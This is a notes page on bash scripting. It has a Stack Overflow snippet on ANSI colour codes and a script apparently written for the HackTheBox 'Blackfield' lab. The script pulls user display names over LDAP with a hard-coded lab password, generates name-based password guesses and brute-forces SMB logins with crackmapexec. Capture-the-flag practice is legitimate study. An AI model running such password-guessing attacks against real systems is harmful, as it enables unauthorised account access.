Bash scripts

**Colors in bash**

https://stackoverflow.com/questions/5947742/how-to-change-the-output-color-of-echo-in-linux

You can use these [*ANSI escape codes*](https://en.wikipedia.org/wiki/ANSI_escape_code):

Black        0;30    Dark Gray    1;30
Red          0;31    Light Red    1;31
Green        0;32    Light Green  1;32
Brown/Orange 0;33    Yellow        1;33
Blue        0;34    Light Blue    1;34
Purple      0;35    Light Purple  1;35
Cyan        0;36    Light Cyan    1;36
Light Gray  0;37    White        1;37
And then use them like this in your script:

#    .---------- constant part!

#    vvvv vvvv-- the code from above

RED='\033[0;31m'
NC='\033[0m' # No Color
printf "I ${RED}love${NC} Stack Overflow\n"
which prints love in red.

From @james-lim's comment, **if you are using the echo command, be sure to use the -e flag to allow backslash escapes**.

# Continued from above example

echo -e "I ${RED}love${NC} Stack Overflow"
(don't add "\n" when using echo unless you want to add additional empty line)
**
**
**
**

* * *

**Extract sAMAccountName from LDAP and create passwords according to their names (Blackfield folders)**

users="$(pwd)/../tmp-users-valid.lst"

for i in $(cat $users)
do
        #Get the displayName from ldap

        search=$(ldapsearch -D support@blackfield.local -w "#00^BlackKnight" -H ldap://10.10.10.192 -b "DC=BLACKFIELD,DC=LOCAL" "(sAMAccountName=${i})"|grep -i "displayName")

        echo $search

        #Filter the displayName

        username=$(echo $search | awk '{print $2,$3}')

        #Create file for the curent user to store the passwords in it

        > $(pwd)/passw-files/${i}.lst

        #Create passwords and fullfil the password file for the current user

        passwords=()

        firstname=$(echo $username | awk '{print $1}')
        lastname=$(echo $username | awk '{print $2}')

        password1=$firstname$lastname

        password2=$(echo $firstname|sed 's/\(\w\)\w*\( \|$\)/\1/g')$lastname

        passwords+=($password1)
        passwords+=($password2)

        for pass in "${passwords[@]}"
        do
                echo $pass >> $(pwd)/passw-files/${i}.lst
        done

        RED='\033[0;31m'
        GREEN='\033[0;32m'
        YELLOW='\033[0;33m'
        NC='\033[0m'

        printf "${YELLOW}Passwords generation done !${NC}\n"
        #printf "${YELLOW}$password2${NC}\n"

        #Brute force the user with the password file that we have generated above

        crackmapexec smb 10.10.10.192 -u $i -p $(pwd)/passw-files/${i}.lst | tee $(pwd)/output/${i}-output.lst

done

* * *